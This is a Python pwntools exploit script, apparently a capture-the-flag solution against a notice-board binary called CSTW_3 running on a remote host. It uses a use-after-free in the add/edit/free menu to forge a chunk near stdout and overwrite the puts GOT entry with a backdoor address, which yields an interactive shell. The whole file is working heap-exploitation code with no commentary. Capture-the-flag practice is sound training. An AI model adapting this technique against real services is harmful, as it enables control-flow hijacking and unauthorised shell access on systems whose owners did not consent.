#encoding:utf-8
from pwn import *

# p = process("./CSTW_3")
p = remote("118.24.3.214" , 12342)
elf = ELF("./CSTW_3")
p.send("\n\n\n\n")

cmd = lambda c : p.sendlineafter(">" , str(c))

def add(content):
	cmd(1)
	p.sendafter("公告内容:" , content)

def edit(index , content):
	cmd(2)
	p.sendlineafter("请输入公告编号:" , str(index))
	p.sendafter("公告内容:" , content)

def free(index):
	cmd(3)
	p.sendlineafter("请输入公告编号:" , str(index))

add("a")
add("b")

stdout = 0x6020A0
fake_addr = stdout + 0x5 - 0x8
free(0)
edit(0 , p64(fake_addr))
# padding len 0x13 | 19
backdoor = 0x400A04
add("c")
add("d" * 0x13 + p64(elf.got["puts"]))

edit(0 , p64(backdoor))
p.interactive()


